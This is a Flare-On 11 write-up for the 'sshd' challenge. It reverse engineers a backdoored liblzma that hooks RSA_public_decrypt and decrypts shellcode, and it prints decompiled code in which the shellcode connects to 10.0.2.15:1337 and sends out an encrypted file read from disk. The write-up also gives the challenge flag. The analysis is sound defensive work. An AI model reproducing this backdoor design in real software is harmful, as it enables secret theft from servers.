Flare-On 11 <br>By DisplayGFX <br>Challenge 5:  sshd
===

 Challenge Description:
```
Our server in the FLARE Intergalactic HQ has crashed! Now criminals are trying to sell me my own data!!! Do your part, random internet hacker, to help FLARE out and tell us what data they stole! We used the best forensic preservation technique of just copying all the files on the system for you.
```

Here is where the real challenge starts. The previous ones took me a couple of hours in total. This one had me stumped for a few days.

What you get with this challenge is an archive of a linux system. A fair portion of the system is stripped out to save on space, for instance, `boot`, `dev`, and more are absent.

But the file we are concerned about is `sshd`, the name of the challenge. after unpacking, you will be able to find this file in `./usr/sbin`.

## `sshd` - static analysis

First thing to do is to get the version of `sshd`.
```
$ ./usr/sbin/sshd --help
unknown option -- -
OpenSSH_9.2p1 Debian-2+deb12u3, OpenSSL 3.3.2 3 Sep 2024
usage: sshd [-46DdeiqTtV] [-C connection_spec] [-c host_cert_file]
            [-E log_file] [-f config_file] [-g login_grace_time]
            [-h host_key_file] [-o option] [-p port] [-u len]
```

Hmm, that date for OpenSSL is suspiciously recent. That is because its referencing **my** version of OpenSSL. To get the archived version, you must first go to the root of the archive, and with `chroot`. Make sure you have the archive on your main system, and not a separate, shared drive (don't ask how I learned this), and run the command `sudo chroot [path to archive] /bin/bash`. This will get you a different prompt, and hopefully one that will grant you the right shell. This is what you get for a response from `sshd`

```
# /usr/sbin/sshd --help
unknown option -- -
OpenSSH_9.2p1 Debian-2+deb12u3, OpenSSL 3.0.14 4 Jun 2024
usage: sshd [-46DdeiqTtV] [-C connection_spec] [-c host_cert_file]
            [-E log_file] [-f config_file] [-g login_grace_time]
            [-h host_key_file] [-o option] [-p port] [-u len]

# apt list --installed | grep ssh

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

libssh2-1/stable,now 1.10.0-3+b1 amd64 [installed,automatic]
openssh-client/stable,stable-security,now 1:9.2p1-2+deb12u3 amd64 [installed,automatic]
openssh-server/stable,stable-security,now 1:9.2p1-2+deb12u3 amd64 [installed]

# apt list --installed | grep ssl

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

libssl3/stable-security,now 3.0.14-1~deb12u2 amd64 [installed,automatic]
openssl/stable-security,now 3.0.14-1~deb12u2 amd64 [installed,automatic]
```

That's a more reasonable version. With this, its possible to compare apples to apples, and see if theres any discrepency. To do that is easy, simply download the `.deb` binary package for [`ssh`](https://snapshot.debian.org/package/openssh/1%3A9.2p1-2%2Bdeb12u3/#openssh-server_1:3a:9.2p1-2:2b:deb12u3) and [`openssl`](https://snapshot.debian.org/package/openssl/3.0.14-1~deb12u2/#libssl3_3.0.14-1:7e:deb12u2), and extract the `libssl3.so.3` and `sshd`

```
$ sha256sum libssl.so.3 ./usr/lib/x86_64-linux-gnu/libssl.so.3 sshd ./usr/sbin/sshd
4d351715e334aa32eebeb2f03f376e5c961a47f73b37f36885c281ce6e24bb57  libssl.so.3
4d351715e334aa32eebeb2f03f376e5c961a47f73b37f36885c281ce6e24bb57  ./usr/lib/x86_64-linux-gnu/libssl.so.3
838332fe9777b307794760e1c4800b16ac17a93a2fe3f2580ceca8ca6ca2caa5  sshd
58b08babb6feff9befe9fdc6e595d50d8a5fec42e269f9b9b80b3b9658d53729  ./usr/sbin/sshd
```

so `libssl.so.3` matches, but `sshd` does not.

The way we can figure out the differences is by running `diff` on the binaries with the below command
```
$ diff -y --suppress-common-lines <(xxd sshd) <(xxd ./usr/sbin/sshd) 
0005af70: 4154 bf01 0000 0055 5348 83ec 3066 0f6f  AT.....USH | 0005af70: c354 bf01 0000 0055 5348 83ec 3066 0f6f  .T.....USH
000c33f0: 5331 f689 fb31 c0bf 0400 0000 e82f aff4  S1...1.... | 000c33f0: c331 f689 fb31 c0bf 0400 0000 e82f aff4  .1...1....
```

If its not obvious from diff, you can examine these locations in ghidra by opening the files up, hitting `G` to jump to an address, and using `file(Y)` to jump to the location based off of position in the file.

Either way, it replaces the first byte in a function with a `c3`, which is the `x86-64` single byte instruction for a return.

So, instead of doing the rest manually, lets use the program `debsums`, and run it with `chroot` to the system archive. Make sure to download the `debsums....deb` file, and the needed supporting deb packages, and install with `dpkg -i`.

Once this is done, lets run the utility, and see what has been changed.

```
root@kali:/# debsums -s
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = "",
        LC_ALL = (unset),
        LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
debsums: changed file /lib/x86_64-linux-gnu/liblzma.so.5.4.1 (from liblzma5:amd64 package)
debsums: changed file /usr/sbin/sshd (from openssh-server package)
```

We just verified the changes in `sshd`, but `liblzma.so.5.4.1` stands out. This package is directly responsible for the "xz backdoor" discovered earlier this year, so this MUST be where the backdoor is. Download for the debian package is [here](https://snapshot.debian.org/package/xz-utils/5.4.1-0.2/#liblzma5_5.4.1-0.2)

Executing a `diff` on this file prints pretty much the whole file, so a simple `diff` is not enough to cut the mustard. Instead, ghidra has a version tracking tool that is perfect for this use case. Load the two libraries into ghidra, and take a look at the binary. If you look at `_INIT_1` in both, you will see a descrepency, in the original one, it gets the info about the CPU, in the altered one, there is a lot more going on, and a string called "RSA_Public_Decrypt" and a bunch of unidentified functions.

```c

void _INIT_1(void)

{
  undefined8 uVar1;
  long in_FS_OFFSET;
  void *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = (void *)0x0;
  uVar1 = FUN_00108b10(&local_18,_strlen,_strlen + 2);
  if ((int)uVar1 == 0) {
    FUN_001091b0(local_18,"RSA_public_decrypt",RSA_public_decrypt_mal,0);
    if (local_18 != (void *)0x0) {
      free(local_18);
    }
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

First, lets identify the functions in this greater function. the first one uses strings like `"failed to find DT_SYMTAB"` and `"failed to find DT_STRTAB"` if you google these, this leads you directly to a github page for a project called [`plthook`](https://github.com/kubo/plthook/tree/master) for the function called `plthook_open_real` under [`plthook_elf.c`](https://github.com/kubo/plthook/blob/master/plthook_elf.c ). matching the functionality with the one under examination leads to the conclusion that its the same function. Great!

Just duplicate the inputs, and create the right types (right click in the data type manager to create a new struct and fill in with the appropriate type), and change the function signature appropriately.

If you do the same for the next function as well, which is the function `plthook_replace` also from `plthook`, you should have something like this.

```c
void _INIT_1(void)

{
  int iVar1;
  long in_FS_OFFSET;
  plthook *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = (plthook *)0x0;
  iVar1 = plthook_open_real(&local_18,_strlen);
  if (iVar1 == 0) {
    plthook_replace(local_18,"RSA_public_decrypt",FUN_RSA_public_decrypt_mal,(void **)0x0);
    if (local_18 != (plthook *)0x0) {
      free(local_18);
    }
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

So, to describe what these two functions are doing, the first one is getting a pointer to what I believe to be openssh or openssl, and using that to get a plthook object, then searching for the "RSA_public_decrypt" functon, and replacing it with its own function, which I have named `FUN_RSA_public_decrypt_mal`. 

If you google `RSA_public_decrypt`, you will find the functon and its signature [here](https://docs.openssl.org/master/man3/RSA_private_encrypt/). Its safe to assume that the malicious function will also have the same signature. 

Lets see what this malicious function is doing. (but changing `from` to be `void *` for who knows what data its going to have)

```c

int RSA_public_decrypt_mal(int flen,void *from,uchar *to,RSA *rsa,int padding)

{
  __uid_t _Var1;
  int iVar2;
  code *pcVar3;
  void *__dest;
  char *pcVar4;
  long in_FS_OFFSET;
  undefined local_108 [200];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  _Var1 = getuid();
  pcVar4 = "RSA_public_decrypt";
  if (_Var1 == 0) {
    if (*from == 0xc5407a48) {
      FUN_001093f0(local_108,(long)from + 4,(long)from + 0x24,0);
      __dest = mmap((void *)0x0,(long)INT_00132360,7,0x22,-1,0);
      pcVar3 = (code *)memcpy(__dest,&DAT_00123960,(long)INT_00132360);
      FUN_00109520(local_108,pcVar3,(long)INT_00132360);
      (*pcVar3)();
      FUN_001093f0(local_108,(long)from + 4,(long)from + 0x24,0);
      FUN_00109520(local_108,pcVar3,(long)INT_00132360);
    }
    pcVar4 = "RSA_public_decrypt ";
  }
  pcVar3 = (code *)dlsym(0,pcVar4);
  iVar2 = (*pcVar3)(flen,from,to,rsa,padding);
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return iVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

A whole bunch of nonsense. It seems that, from what is decipherable, there is some memory copied from a specific area in memory, handled by some function, and then executed. then, the same two functions run over the same block of memory again.

Oh, and if doesn't match on the magic bytes, it will just find the `RSA_public_decrypt` function, and execute that, passing the regular inputs into that.

If you recall, earlier we discovered this was heavily inspired by the xz utils backdoor. even using a similar version of liblzma and xz-utils as well(not covered in the writeup). These algorithms, if you look at them, seem to be doing a lot of mathematical operations. Maybe the two are connected?

If you read this writeup of [reverse engineering the xz backdoor](https://amnesia.sh/malware/2024/04/23/xz.html), you will find that it uses `ChaCha20` to encrypt and decrypt. If you cross reference this with the functions, they will match exactly.

From here, we can make educated guesses for what we are looking for.
- ChaCha20 takes a 256-bit (0x20 bytes) key, and a 96-bit (12 byte) nonce. This lines up from what we see from the program.
- We also know the magic number and can search for that.
- We know the structure of what it should look like. `magic number (4 bytes) + key (32 bytes) + nonce (12 bytes)`

However, we do not have the key. Not yet.

## Coredump and key recovery with Ghidra

We have our magic number, we know the size and structure, all thats left is to go searching.

But for what? Well, if you use the command `find [archive path] -name "*sshd*"`, you would expect just the binary, and maybe folders and a shared object. Actually, there is more!

```
# find / -name "*sshd*"
...
/var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676
...
```

Thats a coredump, presumably of the process moments before taking an archive.

Heres a fun fact that I discovered recently: you can analyze coredumps just like a binary. Its the same assembly, just reoriented in a different manner. Ghidra handles it with grace.

Aside from singing its praises, Ghidra can find the data we are looking for. Open the coredump and analyze it in ghidra. Then, go to the top bar, and look for `Search`, then click that and then `Memory...`. Alternatively, hit the key `S`. Enter in the magic bytes, and if done correctly, you should see 4 entries. 3 of them should be in the format of a RSA key. But, here should be the key and nonce.

after the 4 magic bytes, make two objects, one `byte[32]` for the key, and one `byte[12]` for the nonce. Then, highlight, and right click, `Copy Special...`, and select python bytestring.

This is the key and nonce we are looking for.

## Decrypting the code block

In python, we can now build a script, but lets revisit the program, this time with labels.


```c

int RSA_public_decrypt_mal(int flen,void *from,uchar *to,RSA *rsa,int padding)

{
  __uid_t _Var1;
  int iVar2;
  code *pcVar3;
  void *__dest;
  char *pcVar4;
  long in_FS_OFFSET;
  undefined local_108 [200];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  _Var1 = getuid();
  pcVar4 = "RSA_public_decrypt";
  if (_Var1 == 0) {
    if (*from == 0xc5407a48) {
      ChaCha20-init(local_108,(void *)((long)from + 4),(void *)((long)from + 0x24),0);
      __dest = mmap((void *)0x0,(long)encBlockLen,7,0x22,-1,0);
      pcVar3 = (code *)memcpy(__dest,&encBlock,(long)encBlockLen);
      ChaCha20-crypt(local_108,pcVar3,(long)encBlockLen);
      (*pcVar3)();
      ChaCha20-init(local_108,(void *)((long)from + 4),(void *)((long)from + 0x24),0);
      ChaCha20-crypt(local_108,pcVar3,(long)encBlockLen);
    }
    pcVar4 = "RSA_public_decrypt ";
  }
  pcVar3 = (code *)dlsym(0,pcVar4);
  iVar2 = (*pcVar3)(flen,from,to,rsa,padding);
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return iVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

If you check the `encBlockLen`, you will see that its `0xf96` long and defined in the program. Go ahead and copy that block as a python byte string as well.

Below is a python script that will decrypt the block.

```python
enc =  b'[snip]'
key = b'\x94\x3d\xf6\x38\xa8\x18\x13\xe2\xde\x63\x18\xa5\x07\xf9\xa0\xba\x2d\xbb\x8a\x7b\xa6\x36\x66\xd0\x8d\x11\xa6\x5e\xc9\x14\xd6\x6f'
nonce = b'\xf2\x36\x83\x9f\x4d\xcd\x71\x1a\x52\x86\x29\x55'

from Crypto.Cipher import ChaCha20

print(hex(len(enc)))

def decrypt_chacha20(key, nonce, encrypted_data):
    cipher = ChaCha20.new(key=key, nonce=nonce)
    decrypted_data = cipher.decrypt(encrypted_data)
    return decrypted_data

decrypted_data = decrypt_chacha20(key, nonce, enc)
print(decrypted_data.hex())

```

You could have python decrypt the instructions via unicorn, however, I prefer to paste it back into ghidra. Open the bytes view, and click the left most button in the top bar of the subwindow. Then, paste the hex from the python script into the first byte of the encrypted block.

## Inside the encrypted block

From the first function, a new stack is created in RBP by moving RSP to RBP, and another function is called. I cleaned this one up with the [syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit), and a bit of hand editing

```c

undefined8 FUN_00124722(undefined8 param_1,undefined8 param_2)

{
  uVar2 = FUN_0012397a(0xa00020f,0x539);
  //recieves data in form of key, nonce, and length of data to come
  recvfrom(uVar2,[rbp-0x1278],0x20, ?, NULL, NULL);
  recvfrom(uVar2,[rbp-0x1258],0xc, ?, NULL, NULL);
  recvfrom(uVar2,[rbp-0xc8],0x4, ?, NULL, NULL);
  //recieves file name, ends data with null byte
  datalen = recvfrom(uVar2,[rbp-0x1248],[rbp-0xc8], ?, NULL, NULL);
  [rbp-0x1248][datalen] = '\0'
  //opens file name requested by traffic
  fileptr = open([rbp-0x1248],NULL,NULL);
  //reads 0x80 bytes of file into stack, gets length
  read(fileptr,[rbp-0x1148],0x80);
  [RBP-0xc4] = sizeof([rbp-0x1148]);
  //unknown functions
  FUN_00124632(sendlen,[rbp-0x1148],[rbp-0x1278],[rbp-0x1258],0,0);
  FUN_001246a9();
  //sends data off to same socket as before
  sendto(uVar2,[RBP-0xc4],0x4,NULL,NULL,NULL);
  sendto(uVar2,[rbp-0x1148],sendlen,NULL,NULL,NULL);
  //unknown functions
  FUN_0012396b(uVar2,local_1170,local_ec);
  FUN_001239ef();
  return 0;
}
```

From here, we know what it does, and where to decode next. It calls an unknown function, then It will read in traffic, which seems to be the file name, and the pair of `0x20` bytes, and `0xc` bytes. This looks very much like the ChaCha20 encryption key and nonce like before.

After this, it reads the file, and does something in the block of functions, and sends the data off, lastly to execute the block of functions.

To get a better understanding, you have to identify the functions.

#### `FUN_0012397a` or socketconnect
```c

//custom inputs
int FUN_0012397a(int param_1,short param_2)
{
  server_addr.sin_family = AF_INET; 
  server_addr.sin_port = param_3 << 8;
  server_addr.sin_addr.s_addr = bswap_32(param_4); 

  
  sock = socket(AF_INET,SOCK_STREAM,TCP);
  if (sock < 0){
	  return sock;
  }
  //sets up socket addr
  server_addr.sin_family = AF_INET; 
  server_addr.sin_port = param_2 << 8;
  server_addr.sin_addr.s_addr = bswap_32(param_1); 
  err = connect(sock,server_addr,0x10);
  if (err < 0){
	  return err;
  } else {
	  return sock;
  }
}
```

So, in this case where the inputs are `FUN_0012397a(0xa00020f,0x539)` , the port would be `0x3905`, and the ipv4 address would be `0x0f02000a` or `15.2.0.10`... ahh, yes, according to the [manpages](https://man7.org/linux/man-pages/man7/ip.7.html), the address is in big-endian order, hence the byte swap. It should be `10.0.2.15`. Same goes for the port as well.

So its connecting to `10.0.2.15:1337`. Makes sense, next.

#### `FUN_0012396b` or closeFile

```c
int closeSocket(int sock){
 return close(sock);
}
```
This one is simple, it just closes a file give to it.

#### `FUN_001239ef` or shutdownWrap
```c
int shutdownWrap(int socket,int how){
	return shutdown(socket,how);
}
```
Another wrapper to call shutdown on the socket.

####   `FUN_00124632` and `FUN_001246a9` or ChaCha20 Custom

Not to go too into depth, because I am no expert in cryptography, but a cursory investigation into these functions show that its essentially `ChaCha20`. The operations called upon the data is very familiar to anyone who had looked at this algorithm previously outside the block.

However, there is a difference. One single character.
```c
...
  pcVar4 = "expand 32-byte K";
  puVar6 = (uint32_t *)(keystor + 0x80);
  uVar1 = loadVal((uint8_t *)"expand 32-byte K");
  *puVar6 = uVar1;
  puVar6 = (uint32_t *)(keystor + 0x84);
...
```

"expand 32-byte **K**" part of the constant for key generation has been changed. Which means, to decrypt whatever comes next needs to be decrypted with a custom algorithm. This causes a lot of headaches, especially at the time, because I needed to find a fully custom implementation of `ChaCha20`, which was not trivial. And that doesn't even include the time that it took to find the problem in the first place.

So the program looks more like this
```c
undefined8 FUN_00124722(undefined8 param_1,undefined8 param_2)

{
  sock = socketconnect(0xa00020f,0x539);
  //recieves data in form of key, nonce, and length of data to come
  recvfrom(sock,key,0x20, ?, NULL, NULL);
  recvfrom(sock,nonce,0xc, ?, NULL, NULL);
  recvfrom(sock,filenamelen,0x4, ?, NULL, NULL);
  //recieves file name, ends data with null byte
  datalen = recvfrom(sock,filename,filenamelen, ?, NULL, NULL);
  filename[datalen] = '\0'
  //opens file name requested by traffic
  fileptr = open(filename,NULL,NULL);
  //reads 0x80 bytes of file into stack, gets length
  read(fileptr,fileData,0x80);
  sendlen = sizeof(fileData);
  //unknown functions
  initChaChaKey(chaKey,fileData,key,nonce);
  encryptChaChaData(chaKey,fileData,sendLen);
  //sends data off to same socket as before
  sendto(sock,sendlen,0x4,NULL,NULL,NULL);
  sendto(sock,fileData,sendlen,NULL,NULL,NULL);
  //unknown functions
  closeFile(fileptr);
  shutdown(sock,0);
  return 0;
}
```

Now all thats left is to find the data, key, nonce, and to build a custom decrypter. Luckily, I know where to look, `RBP`.

We know that
- the key is stored in `RBP - 0x1278`, and is `0x20` long
- the nonce is stored `RBP - 0x1258` and is `0xc` long
- the filename is stored in `RBP - 0x1248` and is null terminated (no need for the strlen)
- the encrypted file data is in `RBP - 0x1148`
- The length of the data is stored in `RBP - 0xc4`
However, we dont know where the coredump is, so this is all relative to the encoded block.

One thing mentioned briefly is that we are actually looking at RSP, since that was used as the RBP stack within the encoded block. So we actually need to look at RSP.

But, for this all to work, we need a snapshot of the memory. This is where `coredump` and `gdb` comes in.

## Memory analysis with `gdb`

Note: I would highly recommend `pwngdb` for this step. I use my own setup made with [`splitmind`](https://github.com/jerdna-regeiz/splitmind) for even greater visibility into the process. You don't need `splitmind`, but it makes reading `pwngdb` that much easier.

So, remember the coredump we earlier extracted the key from? This time, we need the register states, so `gdb` is the tool to use for this, and to show off some features that make `gdb` easier to use than Ghidra. Hypothetically, one could grab the value of `RSP` and extract with Ghidra, but I like this way and its my guide.

To do this, first, load in all of the scripts you want to use to make gdb easier. then load in the executable file, and then the coredump with `core-file`.

```
pwndbg> file usr/sbin/sshd
Reading symbols from usr/sbin/sshd...
(No debugging symbols found in usr/sbin/sshd)
pwndbg> core-file var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676
[a whole bunch of warnings to ignore]
pwndbg>
```

	if done correctly, your `RSP` value should be `0x7ffcc6601e98`.

Next, lets carve out the recognizable value, the filename.

```
pwndbg> x/s $rsp-0x1248
0x7ffcc6600c50: "\360\r`\306\374\177" 
```

Hmm, well if you check the error message in `r9`, it says `undefined symbol: RSA_public_decrypt `.

And heres the reason for the coredump, the hackers made a mistake.

recall the string used in the injected function
```c
...
    pcVar4 = "RSA_public_decrypt ";
  }
  pcVar3 = (code *)dlsym(0,pcVar4);
```
There is an extra space. `dlsym` is how the program tries to call the hijacked function again.

But this means that the RSP is also messed up as the crash happened in dlsym. So, in ghidra, we need to find a recognizable value nearby the place we expect.

For reference we used `0x7ffcc6600c50` as the place to find the filename string. If you keep scrolling up in ghidra from that address....... THERE! At `0x7ffcc6600c18` theres a filename. 0x38 off. Lets adjust the offset we use accordingly and...
```
pwndbg> x/s $rsp-0x1248-0x38
0x7ffcc6600c18: "/root/certificate_authority_signing_key.txt"
```

Thats the string! lets get the rest
```
//key
pwndbg> x/32xb $rsp-0x1278-0x38
0x7ffcc6600be8: 0x8d    0xec    0x91    0x12    0xeb    0x76    0x0e    0xda
0x7ffcc6600bf0: 0x7c    0x7d    0x87    0xa4    0x43    0x27    0x1c    0x35
0x7ffcc6600bf8: 0xd9    0xe0    0xcb    0x87    0x89    0x93    0xb4    0xd9
0x7ffcc6600c00: 0x04    0xae    0xf9    0x34    0xfa    0x21    0x66    0xd7
//nonce
pwndbg> x/12xb $rsp-0x1258-0x38
0x7ffcc6600c08: 0x11    0x11    0x11    0x11    0x11    0x11    0x11    0x11
0x7ffcc6600c10: 0x11    0x11    0x11    0x11
//encrypted filedata
pwndbg> x/80xb $rsp-0x1148-0x38 
0x7ffcc6600d18: 0xa9    0xf6    0x34    0x08    0x42    0x2a    0x9e    0x1c 
0x7ffcc6600d20: 0x0c    0x03    0xa8    0x08    0x94    0x70    0xbb    0x8d 
0x7ffcc6600d28: 0xaa    0xdc    0x6d    0x7b    0x24    0xff    0x7f    0x24
0x7ffcc6600d30: 0x7c    0xda    0x83    0x9e    0x92    0xf7    0x07    0x1d 
0x7ffcc6600d38: 0x02    0x63    0x90    0x2e    0xc1    0x58    0x00    0x00
0x7ffcc6600d40: 0xd0    0xb4    0x58    0x6d    0xb4    0x55    0x00    0x00
0x7ffcc6600d48: 0x20    0xea    0x78    0x19    0x4a    0x7f    0x00    0x00 
0x7ffcc6600d50: 0xd0    0xb4    0x58    0x6d    0xb4    0x55    0x00    0x00 
0x7ffcc6600d58: 0x30    0xd1    0x77    0x19    0x4a    0x7f    0x00    0x00
0x7ffcc6600d60: 0xf0    0xcb    0x77    0x19    0x4a    0x7f    0x00    0x00
```

everything past `0x7ffcc6600d38` seems like garbage or at least nonsense pointers. `ChaCha20` is a shift cipher, so we will know if things go wrong soon enough.

Lets take the code from https://github.com/Ginurx/chacha20-c, and modify one line. The one line that can waste a LOT of time if you are not careful.

```c

	const uint8_t *magic_constant = (uint8_t*)"expand 32-byte K";
	ctx->state[0] = pack4(magic_constant + 0 * 4);
	ctx->state[1] = pack4(magic_constant + 1 * 4);
```

And then, lets run the program.

```c
#include "chacha20.c"

int main(void){
    // data = b''
    char nonce[] = {0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11};
    char key[] = {0x8d,0xec,0x91,0x12,0xeb,0x76,0x0e,0xda,
                  0x7c,0x7d,0x87,0xa4,0x43,0x27,0x1c,0x35,
                  0xd9,0xe0,0xcb,0x87,0x89,0x93,0xb4,0xd9,
                  0x04,0xae,0xf9,0x34,0xfa,0x21,0x66,0xd7};
    char buffer[] = {0xa9,0xf6,0x34,0x08,0x42,0x2a,0x9e,0x1c,
                     0x0c,0x03,0xa8,0x08,0x94,0x70,0xbb,0x8d,
                     0xaa,0xdc,0x6d,0x7b,0x24,0xff,0x7f,0x24,
                     0x7c,0xda,0x83,0x9e,0x92,0xf7,0x07,0x1d,
                     0x02,0x63,0x90,0x2e,0xc1,0x58,0x00,0x00,
                     0xd0,0xb4,0x58,0x6d,0xb4,0x55,0x00,0x00};
    struct chacha20_context ctx;
    chacha20_init_context(&ctx, key, nonce, 0);
    chacha20_xor(&ctx, buffer, sizeof(buffer));
    printf("%s",buffer);
}
```

```
supp1y_cha1n_sund4y@flare-on.com
�Xm�U5G����z�z����v�|}��C'5��ˇ������4�!f�
```

Theres the flag. Lets trim this down...

```c
#include "chacha20.c"

int main(void){
    // data = b''
    char nonce[] = {0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11};
    char key[] = {0x8d,0xec,0x91,0x12,0xeb,0x76,0x0e,0xda,
                  0x7c,0x7d,0x87,0xa4,0x43,0x27,0x1c,0x35,
                  0xd9,0xe0,0xcb,0x87,0x89,0x93,0xb4,0xd9,
                  0x04,0xae,0xf9,0x34,0xfa,0x21,0x66,0xd7};
    char buffer[] = {0xa9,0xf6,0x34,0x08,0x42,0x2a,0x9e,0x1c,
                     0x0c,0x03,0xa8,0x08,0x94,0x70,0xbb,0x8d,
                     0xaa,0xdc,0x6d,0x7b,0x24,0xff,0x7f,0x24,
                     0x7c,0xda,0x83,0x9e,0x92,0xf7,0x07,0x1d,
                     0x02};
    struct chacha20_context ctx;
    chacha20_init_context(&ctx, key, nonce, 0);
    chacha20_xor(&ctx, buffer, sizeof(buffer));
    printf("%s",buffer);
}
```

```
supp1y_cha1n_sund4y@flare-on.com
```

And thats the flag!